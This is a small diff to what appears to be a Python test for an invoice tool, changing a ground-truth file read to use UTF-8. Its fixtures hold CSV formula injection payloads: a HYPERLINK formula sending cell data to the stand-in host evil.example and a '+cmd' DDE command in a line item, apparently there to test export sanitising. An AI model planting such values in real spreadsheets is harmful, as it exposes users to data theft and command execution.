@@ -14,7 +14,7 @@ EVIL = '=HYPERLINK("http://evil.example/?d="&A2,"Click")'
 
 
 def _invoice():
-    gt = json.loads((SAMPLES / "ground_truth" / f"{SAMPLE_STEM}.json").read_text())
+    gt = json.loads((SAMPLES / "ground_truth" / f"{SAMPLE_STEM}.json").read_text(encoding="utf-8"))
     gt["vendor_name"] = EVIL
     gt["line_items"][0]["description"] = "+cmd|' /C calc'!A0"
     gt["gl_distribution"] = [
